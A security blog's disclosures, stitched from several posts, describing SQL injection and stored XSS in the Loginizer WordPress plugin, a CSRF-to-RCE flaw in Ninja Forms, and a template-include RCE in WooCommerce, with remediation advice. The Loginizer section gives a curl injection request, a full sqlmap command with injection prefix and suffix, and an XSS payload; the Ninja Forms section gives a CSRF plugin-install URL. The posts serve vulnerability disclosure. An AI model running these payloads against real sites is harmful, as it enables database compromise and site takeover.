<p>Here we talk about Loginizer security plugin for WP that protects web sites from brute force attacks (quite needed functionality) and to provide extra lights and bolts in form of Two Factor Auth, reCAPTCHA, PasswordLess Login&#8230; Recently I performed some checks in the plugin code and few security issues were identified e.g. two paths towards SQLi and one XSS. Beside the fact that plugin code was quite audited in the past (more about this below), in the code remained very severe issues.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#eli5-poc"></a></h2>



<h2>Eli5 PoC</h2>



<p>Plugin counts failed login attempts hooking on <code>wp_login_failed</code> which is called in <code>wp_authenticate</code> e.g. official wp method for performing authentication in XMLRPC and web interface. In wp_signon we have un slashing of username / password pair (isn&#8217;t case for XMLRPC) and like that are sent towards <code>wp_authenticate</code>. Here we have simple <code>sanitize_user</code> which is quite useless when called with <code>$strict = false</code> default parameter value. So, not protected <code>$username</code> travels towards any functionality hooked on <code>wp_login_failed</code>. In Loginizer:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">add_action('wp_login_failed', 'loginizer_login_failed');
</code></pre>



<p>and via function definition we see how raw <code>$username</code> reaches the plugin functionality:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function loginizer_login_failed($username, $is_2fa = ''){
	
	global $wpdb, $loginizer, $lz_cannot_login;
	...
</code></pre>



<p>Also in this function there are calls towards DB with not sanitized DB parameters:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">...
$result = lz_selectquery("SELECT * FROM `".$wpdb->prefix."loginizer_logs` WHERE `ip` = '".$loginizer['current_ip']."';");
...
$sresult = $wpdb->query("UPDATE `".$wpdb->prefix."loginizer_logs` SET `username` = '".$username."', `time` = '".time()."', `count` = `count`+1, `lockout` = '".$lockout."', `url` = '".$url."' WHERE `ip` = '".$loginizer['current_ip']."';");
...
$insert = $wpdb->query("INSERT INTO `".$wpdb->prefix."loginizer_logs` SET `username` = '".$username."', `time` = '".time()."', `count` = '1', `ip` = '".$loginizer['current_ip']."', `lockout` = '0', `url` = '".$url."';");
...
</code></pre>



<p>and we see the places that are vulnerable of SQLi based on user login data. Simplest PoC if you monitor error_logs would be:</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-login.php' --data-raw 'log=test%27loginizer&amp;pwd=fdsfsdfs&amp;wp-submit=Log+In&amp;redirect_to=&amp;testcookie=1'
</code></pre>



<p>and in the error_log you will see</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">[Mon Oct 19 13:20:27.425151 2020] [php7:notice] [pid 129822] [client 127.0.0.1:37896] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'loginizer', `time` = '1603106427', `count` = '1', `ip` = '127.0.0.1', `lo' at line 1 for query INSERT INTO `wp_loginizer_logs` SET `username` = 'test'loginizer', `time` = '1603106427', ...
</code></pre>



<p>This means that we have SQLi in <code>insert</code> statement and insert won&#8217;t occure, because error in this case, but in case of an real attack ip value could be easy owerwritten and useless data to be filled in the logger tables. More stealth approach would be for sqli towards <code>update</code> statement.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">python3 sqlmap.py -u http://local.target/wp-login.php --method='POST' --data='log=&amp;pwd=password&amp;wp-submit=Log+In&amp;redirect_to=&amp;testcookie=1' -p log --prefix="', ip = LEFT(UUID(), 8), url = ( TRUE " --suffix=") -- wpdeeply" --dbms mysql --technique=T --time-sec=1 --current-db --current-user
</code></pre>



<p>As an extra towards this SQLi, in the code, there is following for printing the output in the administration area:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">// Get the logs
	$result = lz_selectquery("SELECT * FROM `".$wpdb->prefix."loginizer_logs` 
							ORDER BY `time` DESC 
							LIMIT ".$lz_env['cur_page'].", ".$lz_env['res_len']."", 1);
...
foreach($result as $ik => $iv){
					$status_button = (!empty($iv['status']) ? 'disable' : 'enable');
					echo '
					&lt;tr>
						&lt;td>
							&lt;input type="checkbox" value="'.$iv['ip'].'" name="lz_reset_ips[]" />
						&lt;/td>
						&lt;td>
							'.$iv['ip'].'
						&lt;/td>
						&lt;td>
							'.$iv['username'].'
						&lt;/td>
</code></pre>



<p>So, beside the fact that <code>sanitize_user</code> function strips the tags, when we are into SQL machinery we have an option for stored XSS attack too:</p>



<pre class="wp-block-code"><code class="">test',ip=concat(char(60),'b',char(62),'wpdeeply',char(60),char(47),'b',char(62),'-',LEFT(UUID(),8)) -- wpdeeply
</code></pre>



<p>And that is it, more than easy and detailed about SQLi + XSS via <code>$username</code>.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#isnt-only-username"></a></h2>



<h2>Isn&#8217;t only username</h2>



<p>This one is much more interesting, yet effective on lower number of setups out there, but is really good issue <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Validation of the ip address happens in the following way:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function lz_valid_ip($ip){
	
	// IPv6
	if(lz_valid_ipv6($ip)){
		return true;
	}
	
	// IPv4
	if(!ip2long($ip)){
		return false;
	}
	
	return true;
}
</code></pre>



<p>and <code>ip2long</code> isn&#8217;t binary safe, so if IP HTTP header reaches the backend with null byte in it, we are talking about SQLi, but also about standard stored XSS vulnerability.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( ip2long("127.0.0.1\x00'&lt;script>") ) echo 'Valid IPv4';
</code></pre>



<p>What are affected setups and how to, won&#8217;t be disclosed in this writing <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#few-facts"></a></h2>



<h2>Few facts</h2>



<ul><li>This plugin was &#8220;target&#8221; few times of not complete audits with some results, <a rel="noreferrer noopener" href="https://blog.wpsec.com/sql-injection-and-csrf-security-vulnerability-in-loginizer/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://blog.dewhurstsecurity.com/2018/05/22/loginizer-wordpress-plugin-xss-vulnerability.html" target="_blank">here</a></li><li>When you perform static code analysis it is strange to suspect that <code>sanitize_user</code> will allow <code>'</code> or <code>"</code>, but anyway debugger need to be employed</li><li>When you perform scanning and you are on local target then it is wise to inspect the error logs of the application and to try all of the parameters</li><li>It is interesting and good to see how wp org managed to push the security update towards WP instances with this plugin <a href="https://wordpress.org/plugins/loginizer/advanced/">https://wordpress.org/plugins/loginizer/advanced/</a> , but are you still comfortable allowing administration of your assets by unknown folks from wp org?</li><li>We all know that WP employed <code>error protection</code> in the core. You think there isn&#8217;t any WP / Loginizer setup that was tried by bot for SQLi on the login form? Are DB errors worth marking as problem in the installation or this feature is there for another reasons?!</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#remediation"></a></h2>



<h2>Remediation</h2>



<ul><li>Update Loginizer plugin and continue with its usage, it is good and useful piece of software.</li><li>Use prepared DB statements.</li><li>Turn off automatic updates from your production environment and follow the active installs from stage. It is about privacy, but also for security.</li></ul>

										<content:encoded><![CDATA[
<p>The <a href="https://plugins.trac.wordpress.org/browser/ninja-forms/tags/3.4.27/services/bootstrap.php#L49" target="_blank" rel="noreferrer noopener">bug</a> is more than simple, GET request with Administrator cookies in it, will result with any plugin from WP dot org installation &amp; activation. If we talk about regular web application, then this wonâ€™t be even a issue and server miss configuration could be blamed (writable executable files), but we talk about WordPress where those conditions are advertised as good and are needed in the name of the security :/</p>



<p>Today the CSRF issues arenâ€™t the thing that much, because browsers protection, developers experience and web admins experience. Anyway, simple GET request cross domain or on same domain that will result with RCE is more than dangerous scenario, easy to be performed and hard to be noticed even by most experienced web masters.</p>



<h2>Eli5 PoC</h2>



<p>In&nbsp;<code>services/bootstrap.php</code>&nbsp;there is ajax action called&nbsp;<code>nf_services_install</code>. If we look at its code we will notice that there isnâ€™t CSRF protection in the form of nonce check / validation, but there is only logged in user permissions check (that is why CSRF attack will work against high privileged accounts)</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( ! current_user_can('install_plugins') )
	die( json_encode( [ 'error' => esc_html__( 'Sorry, you are not allowed to install plugins on this site.' ) ] ) );
	
$plugin = \WPN_Helper::sanitize_text_field($_REQUEST['plugin']);
$install_path = \WPN_Helper::sanitize_text_field($_REQUEST['install_path']);</code></pre>



<p>the rest of the code is plugin download based on&nbsp;<code>$_REQUEST['plugin']</code>&nbsp;and plugin activation, based on&nbsp;<code>$_REQUEST['install_path']</code>. So the final link that need to be opened with&nbsp;<code>Administrator</code>&nbsp;cookies in it will be something like this:</p>



<pre class="wp-block-code"><code class="">hxxts://local.target/wp-admin/admin-ajax.php?action=nf_services_install&amp;plugin=coditor&amp;install_path=coditor/coditor.php 
</code></pre>



<p>Could be shortened link, could be img tag in email or wp instance content, â€¦ There is huge room for successful attack <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h3>What is coditor ?</h3>



<p><a href="https://wordpress.org/plugins/coditor/" target="_blank" rel="noreferrer noopener">Coditor</a> is WP plugin not updated several years, but still active ( was and after my report isnâ€™t any more ) and was vulnerable towards RCE from lowest possible user role on any WP instance e.g. any logged in user. That was possible <a href="https://plugins.trac.wordpress.org/browser/coditor/trunk/coditor.php" target="_blank" rel="noreferrer noopener">because</a>:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">add_action('wp_ajax_coditor_process_ajax', array($this, 'coditor_process_ajax'));</code></pre>



<p>and&nbsp;<code>coditor_process_ajax</code>&nbsp;method allows editing and deletion of any file under&nbsp;<code>$coditor = new Coditor(WP_CONTENT_DIR);</code>&nbsp;=&gt; any plugin / theme.</p>



<h2>Few facts</h2>



<ul><li>In 30 minutes I found several forgotten plugins in the repository with RCE in them (pre auth or subscriber user role)</li><li>Attackers could deploy their own plugin towards wp dot org repository and to add backdoor in next iterations</li><li>If you search and you find for complete attack scenario with vulnerable plugin from the repository, then try to report that plugin towards authors.</li></ul>



<h2>Remediation</h2>



<ul><li>Do not allow your plugins / themes directory to be writable by&nbsp;<code>www-data</code>&nbsp;user beside the fact it is advertised like that by WP folks</li><li>Update to the latest version of Ninja Forms plugin :/</li></ul>

										<content:encoded><![CDATA[
<p>WooCommerce plugin is raw model how good WordPress plugin should look like and very often we can see how many another plugins around eco system very often borrow knowledge/source from it and that is probably ok. What is important to be mentioned here is the fact that there isnâ€™t any log that will show us all of those usages, but changelogs should be enough for developers to get the idea being Security fixes or not? From the 4.1.0 changelog we have the following:</p>



<pre class="wp-block-code"><code class="">* Security - Fixed unescaped meta data while duplicating products. Reported by Slavco.
</code></pre>



<p>but is this enough, is everything told and do you get the idea about the vulnerability?! <br>I know, no or maybe is the answer.</p>



<h2>What is fixed in 4.1.0</h2>



<p>According the logs there is issue with unescaped meta keys while duplicating products and fix is more than obvious e.g. there is&nbsp;<code>wp_slash</code>added to the&nbsp;<code>$meta-&gt;key</code>&nbsp;in&nbsp;<code>class-wc-data-store-wp.php</code>.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">return add_metadata( $this->meta_type, $object->get_id(), wp_slash( $meta->key ), is_string( $meta->value ) ? wp_slash( $meta->value ) : $meta->value, false );

</code></pre>



<p>So where is the RCE? If we see the code diff experienced eye should get the attention of changes in&nbsp;<code>class-wc-template-loader.php</code>&nbsp;file, method&nbsp;<code>get_template_loader_files</code>&nbsp;e.g.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( is_page_template() ) {
			$page_template = get_page_template_slug();

			if ( $page_template ) {
				$validated_file = validate_file( $page_template );
				if ( 0 === $validated_file ) {
					$templates[] = $page_template;
				} else {
					error_log( "WooCommerce: Unable to validate template path: \"$page_template\". Error Code: $validated_file." );
				}
			}
		}
</code></pre>



<p>and this means that there is added validation to the value returned by&nbsp;<code>get_page_template_slug</code>&nbsp;which in fact is&nbsp;<code>_wp_page_template</code> protected meta value. This means that&nbsp;<code>_wp_page_template</code>&nbsp;could hold any value towards any location and that value to be&nbsp;<code>included</code>&nbsp;while rendering templates at WP.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">$template = apply_filters( 'template_include', $template );
	if ( $template ) {
		include $template;
	} elseif
</code></pre>



<h2>Who is affected</h2>



<p>Attack surface is bigger than advertised.</p>



<ul><li>Duplicating products</li><li>Protected meta could be written while importing products trough new Woo importer, remember it is&nbsp;<code>class-wc-data-store-wp.php</code></li><li>Because&nbsp;<code>class-wc-template-loader.php</code>&nbsp;any&nbsp;<code>import</code>&nbsp;user role is RCE able on Woo setups, but there is <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">contributor/visitor</a> attack in game</li><li>Unserialize trough <a href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank" rel="noreferrer noopener">PHAR</a> maybe?</li><li>All of those Woo marketplaces, multi language stores, managed setupsâ€¦</li></ul>



<h2>Remediation</h2>



<p>Take measures about content in any uploaded files on your WP setup, but also for the content of the files that could be created while modifing them.</p>
